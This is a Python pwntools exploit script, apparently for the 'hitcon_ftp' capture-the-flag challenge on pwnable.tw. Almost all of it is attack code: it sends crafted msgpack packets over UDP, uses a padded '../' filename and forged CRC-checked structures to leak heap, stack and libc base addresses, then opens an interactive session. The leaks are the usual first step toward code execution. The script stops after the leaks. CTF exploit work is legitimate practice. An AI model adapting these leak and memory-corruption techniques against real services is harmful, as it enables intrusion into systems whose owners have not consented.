#!/usr/bin/env python3

from pwn import *
import msgpack
import socket
import zlib
import struct

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('hitcon_ftp_patched', checksec=False)
libc = ELF('libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
context.binary = exe

if args.REMOTE:
    if int(sys.argv[1]):
        port = int(sys.argv[1])
    else:
        s  = remote("chall.pwnable.tw", 10309)
        s.recvuntil(b'on udp port: ')
        port = int(s.recvline())
else:
    p = remote("0", 69, typ="udp")

def s_pack(pack, condition = 1):
    if condition == 1:
        data = msgpack.packb(pack,use_bin_type= True )
    else:
        data = msgpack.packb(pack,use_bin_type= False )
         
    print(f'packet: {pack}')
    info(f'packet size: {size(data)}')

    s(data)

def path_2(name, load = None, load2 = None):
    pack = [
        2, name, "octet"
    ]
    if load is not None:
        pack.append(load)
    if load2 is not None:
        pack.append(load2)

    s_pack(pack)

path_2("we")

path_2("../".ljust(0x100, "s"))

ru(b"../".ljust(0x100, b"s"))

heap_base = u64(r(6) + b'\0\0') -0x22ad0
info(f'heap base: {hex(heap_base)}')

def calc_str(data):
    idx = data.find(b'\0')
    res = data[:idx] + p8(0x22)
    print(f'res: {res}')
    print(f'len res: {len(res)}')
    return zlib.crc32(res) & 0xffffffff

def write_file_str(load):
    pack = [
        3, 1, calc_str(load), load
    ]

    pack = msgpack.packb(pack, use_bin_type= False)
    s(pack)

def leak(target_1, target_2, len1 = 8, len2 = 8):
    path_2("wew", {"blksize": 0x200})

    payload = flat(
        0xbeef, 0,
        5, len1, target_1, # key 1
        2, 0x36, target_1, # value 1

        5, len2, target_2,
        2, 0x24, target_2,
    ).ljust(0x200, b's')

    write_file_str(payload)
    load = [
        "blksize", 0x200,
    ]
    for i in range(0xb6):
        load.append(i)

    path_2("as", load, 0x36)

target_stack = heap_base+0x20230
target_binary = heap_base+0x22a80
target_libc = heap_base+0x22b38
leak(target_stack, target_libc)
# ru(b'blksize')
print(ru(b'blksize'))
print(ru(b'blksize'))
r(4)
stack = u64(r(6) + b'\0\0')
info(f'stack: {hex(stack)}')
r(2)
libc_leak = u64(r(6)+ b'\0\0')
libc.address = libc_leak-0x205680

info(f'libc: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')



p.interactive()